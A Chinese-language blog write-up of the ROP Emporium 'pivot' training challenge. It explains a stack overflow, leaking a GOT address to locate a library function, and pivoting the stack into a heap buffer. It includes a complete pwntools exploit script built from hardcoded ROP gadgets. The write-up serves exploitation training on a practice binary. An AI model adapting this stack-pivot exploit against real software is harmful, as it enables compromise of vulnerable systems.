---
title: ROP Emporium の pivot
date: 2020-06-11 15:14:00
categories:
- WriteUPs
- ROP Emporium
tags:
- PWN
- ROP
- Stack
---
## Introduction

&emsp;&emsp;[ROP Emporium](https://ropemporium.com)训练6：pivot的解析。

<!-- more -->

## pivot32

### Step 1

&emsp;&emsp;程序正常运行截图：

![](/img/pivot/pivot1.png)

&emsp;&emsp;发现可能存在内存地址泄露，加上题目给了libc.so文件，猜测可能需要用到ret2libc和延迟绑定技术,详细内容可了解[ret2libc && Lazy Binding](https://coldwave96.github.io/2020/05/19/LazyBinding/)。

&emsp;&emsp;checksec：

![](/img/pivot/pivot2.png)

### Step 2

&emsp;&emsp;pwnme函数中fgets函数存在溢出漏洞，offset为0x28：

![](/img/pivot/pivot3.png)

&emsp;&emsp;程序运行时提示我们call ret2win() from libpivot.so，看下这个函数是什么内容：

![](/img/pivot/pivot4.png)

&emsp;&emsp;那么直接调用这个函数就行了。但是这个函数在libc.so中，需要通过ret2libc实现函数的调用。首先要选择一个函数同时在pivot程序和libc.so中，泄露其真实地址后通过计算得到libc.so加载的基址，加上ret2win函数在libc.so中的offset，直接定位ret2win函数在内存中的真实地址。

&emsp;&emsp;通过比对发现，我们只能选择foothold_function函数来获取libc.so的基址：

![](/img/pivot/pivot5.png)

![](/img/pivot/pivot6.png)

&emsp;&emsp;这时我们会发现pwnme函数中fgets只有0x3a Bytes缓冲区的长度，并不足以存放我们的shellcode，所以需要另找一个位置存放shellcode。

![](/img/pivot/pivot7.png)

&emsp;&emsp;好在程序给了我们一块0x100的堆空间，且具体的内存地址也告诉我们，但是我们需要考虑如何把shellcode写到给的地址上去。

![](/img/pivot/pivot8.png)

&emsp;&emsp;通过上面的几个函数就可以实现将shellcode写到指定的内存地址。

&emsp;&emsp;到此，思路就比较清楚了：第一步先将shellcode写到指定内存地址，第二步利用溢出漏洞使程序跳转到shellcode执行。

&emsp;&emsp;第一步中通过sub_80488c4函数写入，通过sub_80488c0函数控制eax寄存器。为了将栈转移到我们需要的地址，需要通过sub_80488c2控制esp寄存器。在找到libc.so的加载基址后，需要通过sub_80488c7函数将基址加上offset找到ret2win函数在内存中的真实地址。所以我们还需要找到控制ebx寄存器的指令：

![](/img/pivot/pivot9.png)

&emsp;&emsp;第二步中我们还需要一条指令在覆盖fgets函数返回地址后使得程序能够跳转到我们设定的内存地址执行shellcode，由于我们通过sub_80488c4函数将地址写到了eax寄存器中，所以我们需要控制程序跳转的eax寄存器指向的地址：

![](/img/pivot/pivot10.png)

&emsp;&emsp;这样一切准备工作就完成了。

### Step 3

&emsp;&emsp;下面就是EXP的编写：

```Python
* # coding:utf-8
* from pwn import *
* 
* sh = process('./pivot32')
* elf = ELF('./pivot32')
* 
* libc = ELF('./libpivot32.so')
* 
* foothold_function_got = elf.got['foothold_function']
* foothold_function_plt = elf.plt['foothold_function']
* foothold_function_libc = libc.symbols['foothold_function']
* ret2win_libc = libc.symbols['ret2win']
* 
* sh.recvuntil('pivot: ')
* shellcode_addr = int(sh.recv(10), 16)
* 
* pop_eax_addr = 0x80488c0
* xchg_addr = 0x080488c2
* mov_addr = 0x080488c4
* add_addr = 0x080488c7
* 
* pop_ebx_addr = 0x08048571
* jmp_addr = 0x08048a5f
* 
* payload1 = p32(foothold_function_plt) # 调用foothold_function函数，调用时会将foothold_function函数的实际地址写入到GOT表中
* payload1 += p32(pop_eax_addr) + p32(foothold_function_got)# 将foothold_function函数的GOT地址写入eax寄存器
* payload1 += p32(mov_addr) # 将foothold_function函数的GOT地址指向的地址放入eax寄存器，即foothold_function函数在内存中的真实地址
* payload1 += p32(pop_ebx_addr) + p32(ret2win_libc - foothold_function_libc) # 将ret2win函数与foothold_function函数在libc.so文件中的相对偏移放入ebx
* payload1 += p32(add_addr) # foothold_function函数真实地址加上ret2win相对于foothold_function函数的offset即得ret2win函数在内存中的实际地址
* payload1 += p32(jmp_addr) # 使程序跳转到eax中的地址，即泄露的堆空间的入口位置
* 
* sh.recvuntil('>')
* sh.sendline(payload1)
* 
* payload2 = 'a' * (0x28 + 0x4) # padding
* payload2 += p32(pop_eax_addr) + p32(shellcode_addr) # 堆空间的地址放入eax寄存器
* payload2 += p32(xchg_addr) # 交换eax和esp的值，也就是说程序分配的对空间就被当成栈，交换eax和esp的值，也就是说程序分配的堆空间就被当成栈，ret就会返回到栈顶去执行我们精心设计好的shellcode
* 
* sh.recvuntil('smash')
* sh.sendline(payload2)
* 
* sh.interactive()
* sh.close()
```

&emsp;&emsp;* 脚本运行结果图：

![](/img/pivot/pivot11.png)

## pivot

&emsp;&emsp;64位程序和32位思路一模一样，EXP也基本相同，有兴趣的可以自行尝试。
